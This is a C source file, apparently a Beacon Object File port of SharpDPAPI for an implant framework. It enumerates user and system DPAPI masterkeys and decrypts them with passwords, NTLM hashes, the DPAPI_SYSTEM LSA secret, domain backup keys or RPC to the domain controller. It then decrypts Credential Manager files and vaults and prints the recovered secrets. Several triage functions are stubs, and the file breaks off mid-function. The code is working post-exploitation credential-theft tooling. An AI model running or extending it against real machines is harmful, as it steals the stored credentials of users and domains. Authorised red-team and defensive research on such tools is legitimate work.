/*
 * triage.c — File system triage operations for DPAPI artifacts
 * Ported from SharpDPAPI/lib/Triage.cs
 *
 * Handles enumerating and triaging masterkeys, credentials,
 * vaults, certificates, and application-specific DPAPI data.
 */
#include "triage.h"
#include "lsadump.h"
#include "bkrp.h"
#include "beacon.h"
#ifndef COBJMACROS
#define COBJMACROS
#endif
#include <objbase.h>
#include <oleauto.h>
#include <wbemcli.h>

#ifdef BOF
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx(LPVOID, DWORD);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeSecurity(PSECURITY_DESCRIPTOR, LONG, SOLE_AUTHENTICATION_SERVICE*, void*, DWORD, DWORD, void*, DWORD, void*);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoSetProxyBlanket(IUnknown*, DWORD, DWORD, OLECHAR*, DWORD, DWORD, RPC_AUTH_IDENTITY_HANDLE, DWORD);
DECLSPEC_IMPORT void    WINAPI OLE32$CoUninitialize(void);
DECLSPEC_IMPORT BSTR    WINAPI OLEAUT32$SysAllocString(const OLECHAR*);
DECLSPEC_IMPORT void    WINAPI OLEAUT32$SysFreeString(BSTR);
DECLSPEC_IMPORT HRESULT WINAPI OLEAUT32$VariantClear(VARIANTARG*);
#endif

static const CLSID SCCM_WBEM_LOCATOR_CLSID = {
    0x4590f811, 0x1d3a, 0x11d0, { 0x89, 0x1f, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24 }
};

static const IID SCCM_IID_WBEM_LOCATOR = {
    0xdc12a687, 0x737f, 0x11cf, { 0x88, 0x4d, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24 }
};

static const BYTE SCCM_POLICY_OPEN[] = "<PolicySecret Version=\"1\"><![CDATA[";
static const BYTE SCCM_CDATA_CLOSE[] = "]]>";
static const BYTE SCCM_NAA_CLASS_TAG[] = "CCM_NetworkAccessAccount";
static const BYTE SCCM_NAA_USER_PROP[] = "NetworkAccessUsername";
static const BYTE SCCM_NAA_PASS_PROP[] = "NetworkAccessPassword";
static const BYTE SCCM_TS_ANCHOR[] = "</SWDReserved>";

static BOOL looks_like_utf16le(const BYTE* data, int data_len);

/* ---- Internal: read file into buffer ---- */
static BOOL read_file_bytes(const wchar_t* path, BYTE** out_data, int* out_len) {
    HANDLE hFile;
    DWORD size, read;

#ifdef BOF
    hFile = KERNEL32$CreateFileW(path, GENERIC_READ,
                                  FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                                  NULL,
                                  OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    size = KERNEL32$GetFileSize(hFile, NULL);
    if (size == INVALID_FILE_SIZE || size == 0) {
        KERNEL32$CloseHandle(hFile);
        return FALSE;
    }

    *out_data = (BYTE*)intAlloc(size);
    if (!*out_data) { KERNEL32$CloseHandle(hFile); return FALSE; }

    if (!KERNEL32$ReadFile(hFile, *out_data, size, &read, NULL) || read != size) {
        intFree(*out_data);
        *out_data = NULL;
        KERNEL32$CloseHandle(hFile);
        return FALSE;
    }

    KERNEL32$CloseHandle(hFile);
#else
    hFile = CreateFileW(path, GENERIC_READ,
                         FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                         NULL,
                         OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    size = GetFileSize(hFile, NULL);
    if (size == INVALID_FILE_SIZE || size == 0) { CloseHandle(hFile); return FALSE; }

    *out_data = (BYTE*)intAlloc(size);
    if (!*out_data) { CloseHandle(hFile); return FALSE; }

    if (!ReadFile(hFile, *out_data, size, &read, NULL) || read != size) {
        intFree(*out_data);
        *out_data = NULL;
        CloseHandle(hFile);
        return FALSE;
    }

    CloseHandle(hFile);
#endif

    *out_len = (int)size;
    return TRUE;
}

/* ---- Internal: enumerate files in a directory ---- */
typedef void (*FILE_CALLBACK)(const wchar_t* full_path, void* ctx);

static void enumerate_files(const wchar_t* dir, const wchar_t* pattern,
                            FILE_CALLBACK callback, void* ctx) {
    wchar_t search[MAX_PATH * 2];
    swprintf(search, L"%s\\%s", dir, pattern ? pattern : L"*");

    WIN32_FIND_DATAW ffd;
    HANDLE hFind;

#ifdef BOF
    hFind = KERNEL32$FindFirstFileW(search, &ffd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        if (wcscmp(ffd.cFileName, L".") == 0 || wcscmp(ffd.cFileName, L"..") == 0) continue;

        wchar_t full_path[MAX_PATH * 2];
        swprintf(full_path, L"%s\\%s", dir, ffd.cFileName);
        if (callback) callback(full_path, ctx);
    } while (KERNEL32$FindNextFileW(hFind, &ffd));
    KERNEL32$FindClose(hFind);
#else
    hFind = FindFirstFileW(search, &ffd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        if (wcscmp(ffd.cFileName, L".") == 0 || wcscmp(ffd.cFileName, L"..") == 0) continue;

        wchar_t full_path[MAX_PATH * 2];
        swprintf(full_path, L"%s\\%s", dir, ffd.cFileName);
        if (callback) callback(full_path, ctx);
    } while (FindNextFileW(hFind, &ffd));
    FindClose(hFind);
#endif
}

/* ---- Internal: enumerate subdirectories ---- */
static void enumerate_dirs(const wchar_t* dir, FILE_CALLBACK callback, void* ctx) {
    wchar_t search[MAX_PATH * 2];
    swprintf(search, L"%s\\*", dir);

    WIN32_FIND_DATAW ffd;
    HANDLE hFind;

#ifdef BOF
    hFind = KERNEL32$FindFirstFileW(search, &ffd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (wcscmp(ffd.cFileName, L".") == 0 || wcscmp(ffd.cFileName, L"..") == 0) continue;

        wchar_t full_path[MAX_PATH * 2];
        swprintf(full_path, L"%s\\%s", dir, ffd.cFileName);
        if (callback) callback(full_path, ctx);
    } while (KERNEL32$FindNextFileW(hFind, &ffd));
    KERNEL32$FindClose(hFind);
#else
    hFind = FindFirstFileW(search, &ffd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (wcscmp(ffd.cFileName, L".") == 0 || wcscmp(ffd.cFileName, L"..") == 0) continue;

        wchar_t full_path[MAX_PATH * 2];
        swprintf(full_path, L"%s\\%s", dir, ffd.cFileName);
        if (callback) callback(full_path, ctx);
    } while (FindNextFileW(hFind, &ffd));
    FindClose(hFind);
#endif
}

/* ============================================================
 * Masterkey Triage Context
 * ============================================================ */

typedef struct {
    MASTERKEY_CACHE* cache;
    const BYTE* pvk;
    int pvk_len;
    const char* password;
    const char* ntlm;
    const char* credkey;
    BOOL use_rpc;
    const wchar_t* dc_name;  /* DC for RPC calls */
    const char* sid;
    BOOL hashes_only;
    int processed;
    int decrypted;
} MK_TRIAGE_CTX;

static BOOL guid_from_masterkey_path(const wchar_t* path, GUID* guid) {
    if (!path || !guid) return FALSE;

    const wchar_t* base = path;
    for (const wchar_t* p = path; *p; p++) {
        if (*p == L'\\' || *p == L'/') base = p + 1;
    }

    int len = (int)wcslen(base);
    if (len != 36 && len != 38) return FALSE;

    char tmp[40];
    memset(tmp, 0, sizeof(tmp));
    for (int i = 0; i < len; i++) {
        wchar_t c = base[i];
        if (c > 0x7f) return FALSE;
        tmp[i] = (char)c;
    }

    return string_to_guid(tmp, guid);
}

static BOOL is_plausible_masterkey_blob(const BYTE* mk_bytes, int mk_len) {
    if (!mk_bytes || mk_len < 96) return FALSE;

    DWORD version = *(DWORD*)(mk_bytes + 0);
    if (version == 0 || version > 5) return FALSE;

    int offset = 20; /* version + 16-byte salt */
    if (offset + 12 > mk_len) return FALSE;

    DWORD rounds = *(DWORD*)(mk_bytes + offset); offset += 4;
    DWORD alg_hash = *(DWORD*)(mk_bytes + offset); offset += 4;
    DWORD alg_crypt = *(DWORD*)(mk_bytes + offset);

    if (rounds == 0 || rounds > 10000000) return FALSE;
    if (alg_hash != CALG_SHA1 && alg_hash != CALG_HMAC && alg_hash != CALG_SHA_512)
        return FALSE;
    if (alg_crypt != CALG_3DES && alg_crypt != CALG_3DES_112 && alg_crypt != CALG_AES_256)
        return FALSE;

    return TRUE;
}

static void print_masterkey_debug(const wchar_t* path, const BYTE* mk_bytes, int mk_len,
                                  BOOL raw_machine_ok, BOOL raw_user_ok,
                                  BOOL shifted_machine_ok, BOOL shifted_user_ok) {
    if (!path || !mk_bytes || mk_len < 32) return;

    DWORD version = *(DWORD*)(mk_bytes + 0);
    DWORD rounds = *(DWORD*)(mk_bytes + 20);
    DWORD alg_hash = *(DWORD*)(mk_bytes + 24);
    DWORD alg_crypt = *(DWORD*)(mk_bytes + 28);

    char* path_utf8 = wide_to_utf8(path);
    BeaconPrintf(CALLBACK_OUTPUT,
                 "    [mkdbg] path=%s ver=%u rounds=%u hash=0x%08x crypt=0x%08x rawM=%s rawU=%s shM=%s shU=%s\n",
                 path_utf8 ? path_utf8 : "?",
                 version, rounds, alg_hash, alg_crypt,
                 raw_machine_ok ? "ok" : "fail",
                 raw_user_ok ? "ok" : "fail",
                 shifted_machine_ok ? "ok" : "fail",
                 shifted_user_ok ? "ok" : "fail");
    if (path_utf8) intFree(path_utf8);
}

/* ---- Callback: process a single masterkey file ---- */
static void triage_masterkey_file_cb(const wchar_t* path, void* ctx) {
    MK_TRIAGE_CTX* tc = (MK_TRIAGE_CTX*)ctx;
    GUID file_guid;
    if (!guid_from_masterkey_path(path, &file_guid)) return;

    BYTE* data = NULL;
    int data_len = 0;

    if (!read_file_bytes(path, &data, &data_len)) return;
    tc->processed++;

    /* Parse the masterkey file */
    BYTE* mk_bytes = NULL;
    BYTE* bk_bytes = NULL;
    BYTE* dk_bytes = NULL;
    int mk_len = 0, bk_len = 0, dk_len = 0;
    GUID mk_guid;

    if (!parse_masterkey_file(data, data_len, &mk_bytes, &mk_len,
                              &bk_bytes, &bk_len, &dk_bytes, &dk_len, &mk_guid)) {
        intFree(data);
        return;
    }

    if (!is_plausible_masterkey_blob(mk_bytes, mk_len)) {
        if (mk_bytes) intFree(mk_bytes);
        if (bk_bytes) intFree(bk_bytes);
        if (dk_bytes) intFree(dk_bytes);
        intFree(data);
        return;
    }
    memcpy(&mk_guid, &file_guid, sizeof(GUID));

    if (tc->hashes_only && mk_bytes) {
        /* Output hash format only */
        char* sid = tc->sid ? (char*)tc->sid : extract_sid_from_path(path);
        if (sid && mk_bytes) {
            char* hash = format_hash(mk_bytes, mk_len, sid);
            if (hash) {
                BeaconPrintf(CALLBACK_OUTPUT, "%s\n", hash);
                intFree(hash);
            }
        }
        if (sid != tc->sid && sid) intFree(sid);
    }

    /* Try to decrypt with each available key */
    BYTE sha1[20];
    BOOL decrypted = FALSE;
    BOOL raw_machine_ok = FALSE;
    BOOL raw_user_ok = FALSE;
    BOOL shifted_machine_ok = FALSE;
    BOOL shifted_user_ok = FALSE;

    /* Try raw 40-byte DPAPI_SYSTEM machine/user key layout first */
    if (!decrypted && tc->pvk && tc->pvk_len >= 40 &&
        tc->sid && strcmp(tc->sid, "S-1-5-18") == 0) {
        if (decrypt_masterkey_with_sha(mk_bytes, mk_len,
                                       tc->pvk, 20,
                                       sha1)) {
            decrypted = TRUE;
            raw_machine_ok = TRUE;
        }
    }
    if (!decrypted && tc->pvk && tc->pvk_len >= 40 &&
        tc->sid && strcmp(tc->sid, "S-1-5-18") == 0) {
        if (decrypt_masterkey_with_sha(mk_bytes, mk_len,
                                       tc->pvk + 20, 20,
                                       sha1)) {
            decrypted = TRUE;
            raw_user_ok = TRUE;
        }
    }

    /* Also try a 4-byte-prefixed layout if present */
    if (!decrypted && tc->pvk && tc->pvk_len >= 44 &&
        tc->sid && strcmp(tc->sid, "S-1-5-18") == 0) {
        if (decrypt_masterkey_with_sha(mk_bytes, mk_len,
                                       tc->pvk + 4, 20,
                                       sha1)) {
            decrypted = TRUE;
            shifted_machine_ok = TRUE;
        }
    }
    if (!decrypted && tc->pvk && tc->pvk_len >= 44 &&
        tc->sid && strcmp(tc->sid, "S-1-5-18") == 0) {
        if (decrypt_masterkey_with_sha(mk_bytes, mk_len,
                                       tc->pvk + 24, 20,
                                       sha1)) {
            decrypted = TRUE;
            shifted_user_ok = TRUE;
        }
    }

    /* Try PVK (domain backup key) first */
    if (!decrypted && tc->pvk && tc->pvk_len > 0 && dk_bytes && dk_len > 0) {
        /* Use domain key from the masterkey file with PVK */
        /* This involves RSA decryption of the domain key section */
        /* Simplified: try the domain key path */
        if (decrypt_masterkey_with_sha(mk_bytes, mk_len, tc->pvk, tc->pvk_len, sha1)) {
            decrypted = TRUE;
        }
    }

    /* Try password */
    if (!decrypted && tc->password) {
        char* sid = tc->sid ? (char*)tc->sid : extract_sid_from_path(path);
        if (sid) {
            BYTE* pre_key = NULL;
            int pk_len = 0;
            if (derive_pre_key(tc->password, sid, FALSE, 1, &pre_key, &pk_len)) {
                if (decrypt_masterkey(mk_bytes, mk_len, pre_key, pk_len, sha1))
                    decrypted = TRUE;
                intFree(pre_key);
            }
            /* Also try NTLM-based pre-key */
            if (!decrypted) {
                if (derive_pre_key(tc->password, sid, FALSE, 2, &pre_key, &pk_len)) {
                    if (decrypt_masterkey(mk_bytes, mk_len, pre_key, pk_len, sha1))
                        decrypted = TRUE;
                    intFree(pre_key);
                }
            }
            if (sid != tc->sid) intFree(sid);
        }
    }

    /* Try NTLM hash directly */
    if (!decrypted && tc->ntlm) {
        int ntlm_len = 0;
        BYTE* ntlm_bytes = hex_to_bytes(tc->ntlm, &ntlm_len);
        if (ntlm_bytes && ntlm_len == 16) {
            char* sid = tc->sid ? (char*)tc->sid : extract_sid_from_path(path);
            if (sid) {
                BYTE pre_key[20];
                if (hmac_sha1(ntlm_bytes, 16, (BYTE*)sid, strlen(sid), pre_key)) {
                    if (decrypt_masterkey(mk_bytes, mk_len, pre_key, 20, sha1))
                        decrypted = TRUE;
                }
                if (sid != tc->sid) intFree(sid);
            }
            intFree(ntlm_bytes);
        }
    }

    /* Try RPC (MS-BKRP) — ask the DC to decrypt the domain key */
    if (!decrypted && tc->use_rpc && tc->dc_name) {
        BYTE* dk = NULL;
        int dkl = 0;
        if (dpapi_get_domain_key(data, data_len, &dk, &dkl)) {
            BYTE rpc_key[64];
            int rpc_len = 0;
            if (bkrp_decrypt_masterkey(tc->dc_name, dk, dkl, rpc_key, &rpc_len)) {
                /* Hash the 64-byte plaintext key to get the SHA1 */
                sha1_hash(rpc_key, rpc_len, sha1);
                decrypted = TRUE;
            }
            intFree(dk);
        }
    }

    if (decrypted) {
        /* Add to cache */
        mk_cache_add(tc->cache, &mk_guid, sha1);
        tc->decrypted++;

        char* guid_str = guid_to_string(&mk_guid);
        char* sha1_hex = bytes_to_hex(sha1, 20);
        if (guid_str && sha1_hex) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] %s : %s\n", guid_str, sha1_hex);
        }
        if (guid_str) intFree(guid_str);
        if (sha1_hex) intFree(sha1_hex);
    } else if (tc->sid && strcmp(tc->sid, "S-1-5-18") == 0) {
        print_masterkey_debug(path, mk_bytes, mk_len,
                              raw_machine_ok, raw_user_ok,
                              shifted_machine_ok, shifted_user_ok);
    }

    if (mk_bytes) intFree(mk_bytes);
    if (bk_bytes) intFree(bk_bytes);
    if (dk_bytes) intFree(dk_bytes);
    intFree(data);
}

/* ============================================================
 * Main Triage Functions
 * ============================================================ */

BOOL triage_user_masterkeys(MASTERKEY_CACHE* cache,
                            const BYTE* pvk, int pvk_len,
                            const char* password,
                            const char* ntlm,
                            const char* credkey,
                            BOOL use_rpc,
                            const wchar_t* target,
                            const wchar_t* server,
                            BOOL hashes_only,
                            const char* sid) {
    MK_TRIAGE_CTX ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.cache = cache;
    ctx.pvk = pvk;
    ctx.pvk_len = pvk_len;
    ctx.password = password;
    ctx.ntlm = ntlm;
    ctx.credkey = credkey;
    ctx.use_rpc = use_rpc;
    ctx.hashes_only = hashes_only;
    ctx.sid = sid;
    ctx.dc_name = NULL;

    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Triaging user masterkeys...\n");

    /* If RPC mode, discover the DC */
    wchar_t* dc_alloc = NULL;
    if (use_rpc) {
        PDOMAIN_CONTROLLER_INFOW dci = NULL;
        DWORD rc;
#ifdef BOF
        rc = NETAPI32$DsGetDcNameW(NULL, NULL, NULL, NULL, 0, &dci);
#else
        rc = DsGetDcNameW(NULL, NULL, NULL, NULL, 0, &dci);
#endif
        if (rc == 0 && dci && dci->DomainControllerName) {
            /* DomainControllerName is like "\\DC01" — skip leading backslashes */
            wchar_t* name = dci->DomainControllerName;
            while (*name == L'\\') name++;
            int len = wcslen(name);
            dc_alloc = (wchar_t*)intAlloc((len + 1) * sizeof(wchar_t));
            if (dc_alloc) {
                memcpy(dc_alloc, name, len * sizeof(wchar_t));
                dc_alloc[len] = 0;
                ctx.dc_name = dc_alloc;
            }
#ifdef BOF
            NETAPI32$NetApiBufferFree(dci);
#else
            NetApiBufferFree(dci);
#endif
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Using DC: %S for RPC masterkey decryption\n", ctx.dc_name);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to discover DC (err 0x%08X). /rpc requires domain membership.\n", rc);
        }
    }

    /* Get all user profile directories */
    int user_count = 0;
    wchar_t** users = get_user_folders(&user_count);

    for (int i = 0; i < user_count; i++) {
        wchar_t mk_path[MAX_PATH * 2];
        swprintf(mk_path, L"%s\\AppData\\Roaming\\Microsoft\\Protect", users[i]);

        /* For each SID directory, triage masterkey files */
        WIN32_FIND_DATAW ffd;
        wchar_t search[MAX_PATH * 2];
        swprintf(search, L"%s\\S-1-5-*", mk_path);

        HANDLE hFind;
#ifdef BOF
        hFind = KERNEL32$FindFirstFileW(search, &ffd);
#else
        hFind = FindFirstFileW(search, &ffd);
#endif
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;

                wchar_t sid_path[MAX_PATH * 2];
                swprintf(sid_path, L"%s\\%s", mk_path, ffd.cFileName);

                /* Extract SID from directory name */
                char* user_sid = wide_to_utf8(ffd.cFileName);
                ctx.sid = user_sid;

                BeaconPrintf(CALLBACK_OUTPUT, "\n[*] User: %s (%s)\n",
                             user_sid ? user_sid : "?",
                             wide_to_utf8(users[i]));

                enumerate_files(sid_path, NULL, triage_masterkey_file_cb, &ctx);

                if (user_sid) intFree(user_sid);

#ifdef BOF
            } while (KERNEL32$FindNextFileW(hFind, &ffd));
            KERNEL32$FindClose(hFind);
#else
            } while (FindNextFileW(hFind, &ffd));
            FindClose(hFind);
#endif
        }
    }

    /* Free user folders */
    for (int i = 0; i < user_count; i++) {
        intFree(users[i]);
    }
    if (users) intFree(users);
    if (dc_alloc) intFree(dc_alloc);

    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Processed %d masterkey files, decrypted %d\n",
                 ctx.processed, ctx.decrypted);

    return (ctx.decrypted > 0);
}

/* ---- System masterkey triage ---- */
BOOL triage_system_masterkeys(MASTERKEY_CACHE* cache) {
    /*
     * System masterkeys are at:
     *   C:\Windows\System32\Microsoft\Protect\S-1-5-18\
     * Key is DPAPI_SYSTEM LSA secret
     */
    BYTE* dpapi_key = NULL;
    int key_len = 0;

    if (!is_high_integrity()) {
        BeaconPrintf(CALLBACK_ERROR, "[!] System masterkey triage requires high integrity\n");
        return FALSE;
    }

    if (!get_dpapi_keys(&dpapi_key, &key_len)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to retrieve DPAPI_SYSTEM key\n");
        return FALSE;
    }

    /* DPAPI_SYSTEM: [4 version][20 machine key][20 user key] */
    BYTE* machine_key = dpapi_key + 4;   /* 20 bytes */
    BYTE* user_key = dpapi_key + 24;      /* 20 bytes */

    char* mk_hex = bytes_to_hex(machine_key, 20);
    char* uk_hex = bytes_to_hex(user_key, 20);
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] DPAPI_SYSTEM machine key: %s\n", mk_hex ? mk_hex : "?");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] DPAPI_SYSTEM user key:    %s\n", uk_hex ? uk_hex : "?");
    if (mk_hex) intFree(mk_hex);
    if (uk_hex) intFree(uk_hex);

    /* Triage system masterkeys */
    wchar_t system_path[] = L"C:\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18";

    MK_TRIAGE_CTX ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.cache = cache;
    ctx.pvk = dpapi_key;
    ctx.pvk_len = key_len;
    ctx.sid = "S-1-5-18";

    enumerate_files(system_path, NULL, triage_masterkey_file_cb, &ctx);
    wchar_t system_user_path[] = L"C:\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User";
    enumerate_files(system_user_path, NULL, triage_masterkey_file_cb, &ctx);

    intFree(dpapi_key);

    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] System masterkeys: processed %d, decrypted %d\n",
                 ctx.processed, ctx.decrypted);

    return (ctx.decrypted > 0);
}

/* ============================================================
 * Credential Triage
 * ============================================================ */

typedef struct {
    MASTERKEY_CACHE* cache;
    int found;
    BOOL unprotect;
} CRED_TRIAGE_CTX;

static void triage_cred_file_cb(const wchar_t* path, void* ctx) {
    CRED_TRIAGE_CTX* tc = (CRED_TRIAGE_CTX*)ctx;
    BYTE* data = NULL;
    int data_len = 0;

    if (!read_file_bytes(path, &data, &data_len)) return;

    char* path_str = wide_to_utf8(path);
    BeaconPrintf(CALLBACK_OUTPUT, "\n  CredFile     : %s\n", path_str ? path_str : "?");
    if (path_str) intFree(path_str);

    describe_credential(data, data_len, tc->cache, tc->unprotect, NULL);
    tc->found++;

    intFree(data);
}

BOOL triage_cred_file(MASTERKEY_CACHE* cache, const wchar_t* file_path, BOOL unprotect) {
    CRED_TRIAGE_CTX ctx = { cache, 0, unprotect };
    triage_cred_file_cb(file_path, &ctx);
    return (ctx.found > 0);
}

BOOL triage_cred_folder(MASTERKEY_CACHE* cache, const wchar_t* folder, BOOL unprotect) {
    CRED_TRIAGE_CTX ctx = { cache, 0, unprotect };
    enumerate_files(folder, NULL, triage_cred_file_cb, &ctx);
    return (ctx.found > 0);
}

BOOL triage_user_creds(MASTERKEY_CACHE* cache,
                       const wchar_t* target,
                       const wchar_t* server,
                       BOOL unprotect) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Triaging user credentials...\n");

    int user_count = 0;
    wchar_t** users = get_user_folders(&user_count);

    for (int i = 0; i < user_count; i++) {
        wchar_t cred_path[MAX_PATH * 2];
        swprintf(cred_path, L"%s\\AppData\\Roaming\\Microsoft\\Credentials", users[i]);
        triage_cred_folder(cache, cred_path, unprotect);

        /* Also check Local\Credentials */
        swprintf(cred_path, L"%s\\AppData\\Local\\Microsoft\\Credentials", users[i]);
        triage_cred_folder(cache, cred_path, unprotect);
    }

    for (int i = 0; i < user_count; i++) intFree(users[i]);
    if (users) intFree(users);

    return TRUE;
}

BOOL triage_system_creds(MASTERKEY_CACHE* cache, BOOL unprotect) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Triaging system credentials...\n");

    wchar_t path[] = L"C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials";
    return triage_cred_folder(cache, path, unprotect);
}

/* ============================================================
 * Vault Triage
 * ============================================================ */

BOOL triage_vault_folder(MASTERKEY_CACHE* cache, const wchar_t* folder) {
    /* Read Policy.vpol first, then credential files */
    wchar_t vpol_path[MAX_PATH * 2];
    swprintf(vpol_path, L"%s\\Policy.vpol", folder);

    BYTE* vpol_data = NULL;
    int vpol_len = 0;
    BYTE* aes128 = NULL;
    BYTE* aes256 = NULL;

    if (read_file_bytes(vpol_path, &vpol_data, &vpol_len)) {
        describe_vault_policy(vpol_data, vpol_len, cache, &aes128, &aes256, NULL);
        intFree(vpol_data);
    }

    /* Enumerate .vcrd files */
    WIN32_FIND_DATAW ffd;
    wchar_t search[MAX_PATH * 2];
    swprintf(search, L"%s\\*.vcrd", folder);

    HANDLE hFind;
#ifdef BOF
    hFind = KERNEL32$FindFirstFileW(search, &ffd);
#else
    hFind = FindFirstFileW(search, &ffd);
#endif
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            wchar_t vcrd_path[MAX_PATH * 2];
            swprintf(vcrd_path, L"%s\\%s", folder, ffd.cFileName);

            BYTE* data = NULL;
            int data_len = 0;
            if (read_file_bytes(vcrd_path, &data, &data_len)) {
                describe_vault_cred(data, data_len, aes128, aes256, NULL);
                intFree(data);
            }
#ifdef BOF
        } while (KERNEL32$FindNextFileW(hFind, &ffd));
        KERNEL32$FindClose(hFind);
#else
        } while (FindNextFileW(hFind, &ffd));
        FindClose(hFind);
#endif
    }

    if (aes128) intFree(aes128);
    if (aes256) intFree(aes256);

    return TRUE;
}

BOOL triage_user_vaults(MASTERKEY_CACHE* cache,
                        const wchar_t* target,
                        const wchar_t* server) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Triaging user vaults...\n");

    int user_count = 0;
    wchar_t** users = get_user_folders(&user_count);

    for (int i = 0; i < user_count; i++) {
        wchar_t vault_path[MAX_PATH * 2];
        swprintf(vault_path, L"%s\\AppData\\Roaming\\Microsoft\\Vault", users[i]);

        /* Each vault is in a {GUID} subdirectory */
        enumerate_dirs(vault_path, (FILE_CALLBACK)triage_vault_folder, cache);

        swprintf(vault_path, L"%s\\AppData\\Local\\Microsoft\\Vault", users[i]);
        enumerate_dirs(vault_path, (FILE_CALLBACK)triage_vault_folder, cache);
    }

    for (int i = 0; i < user_count; i++) intFree(users[i]);
    if (users) intFree(users);

    return TRUE;
}

BOOL triage_system_vaults(MASTERKEY_CACHE* cache) {
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Triaging system vaults...\n");

    wchar_t path[] = L"C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Vault";
    enumerate_dirs(path, (FILE_CALLBACK)triage_vault_folder, cache);
    return TRUE;
}

/* ============================================================
 * Certificate / KeePass / RDCMan / PS stubs (Phase 3)
 * ============================================================ */

BOOL triage_user_certs(MASTERKEY_CACHE* cache, const wchar_t* target,
                       const wchar_t* server, BOOL show_all) {
    /* TODO: Phase 3 */
    return FALSE;
}

BOOL triage_system_certs(MASTERKEY_CACHE* cache, const wchar_t* target,
                         BOOL show_all) {
    /* TODO: Phase 3 */
    return FALSE;
}

BOOL triage_cert_folder(MASTERKEY_CACHE* cache, const wchar_t* folder,
                        BOOL show_all) {
    return FALSE;
}

BOOL triage_cert_file(MASTERKEY_CACHE* cache, const wchar_t* file_path,
                      BOOL show_all) {
    return FALSE;
}

BOOL triage_keepass(MASTERKEY_CACHE* cache, const wchar_t* target,
                    BOOL unprotect) {
    return FALSE;
}

BOOL triage_keepass_key_file(MASTERKEY_CACHE* cache, const wchar_t* file_path,
                             BOOL unprotect) {
    return FALSE;
}

BOOL triage_rdcman(MASTERKEY_CACHE* cache, const wchar_t* target,
                   BOOL unprotect) {
    return FALSE;
}

BOOL triage_rdcman_file(MASTERKEY_CACHE* cache, const wchar_t* file_path,
                        BOOL unprotect) {
    return FALSE;
}

BOOL triage_rdg_folder(MASTERKEY_CACHE* cache, const wchar_t* folder,
                       BOOL unprotect) {
    return FALSE;
}

BOOL triage_rdg_file(MASTERKEY_CACHE* cache, const wchar_t* file_path,
                     BOOL unprotect) {
    return FALSE;
}

BOOL triage_ps_cred_file(MASTERKEY_CACHE* cache, const wchar_t* file_path,
                         BOOL unprotect) {
    return FALSE;
}

BOOL display_cred_profile(const wchar_t* file_path, const char* username,
                          const char* password_enc) {
    return FALSE;
}

/* ============================================================
 * Chrome / Search / SCCM stubs (Phase 5)
 * ============================================================ */

BOOL triage_chrome_logins(MASTERKEY_CACHE* cache,
                          const wchar_t* target, const wchar_t* server,
                          BOOL unprotect,
                          const BYTE* state_key, int state_key_len) {
    /* TODO: Phase 5 — parse Chrome Login Data SQLite */
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Chrome logins triage (not yet implemented)\n");
    return FALSE;
}

BOOL triage_chrome_cookies(MASTERKEY_CACHE* cache,
                           const wchar_t* target, const wchar_t* server,
                           BOOL unprotect,
                           const BYTE* state_key, int state_key_len,
                           const char* cookie_regex, const char* url_regex) {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Chrome cookies triage (not yet implemented)\n");
    return FALSE;
}

BOOL triage_chrome_statekeys(MASTERKEY_CACHE* cache,
                             const wchar_t* target, const wchar_t* server,
                             BOOL unprotect) {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Chrome state keys triage (not yet implemented)\n");
    return FALSE;
}

BOOL triage_search(MASTERKEY_CACHE* cache,
                   const wchar_t* target, const wchar_t* server,
                   const char* pattern) {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] DPAPI blob search (not yet implemented)\n");
    return FALSE;
}

static int find_bytes(const BYTE* data, int data_len,
                      int start, const BYTE* needle, int needle_len) {
    if (!data || !needle || data_len <= 0 || needle_len <= 0 || start < 0) return -1;
    if (start + needle_len > data_len) return -1;
    for (int i = start; i + needle_len <= data_len; i++) {
        if (memcmp(data + i, needle, needle_len) == 0) return i;
    }
    return -1;
}

static char* extract_ascii(const BYTE* data, int start, int end) {
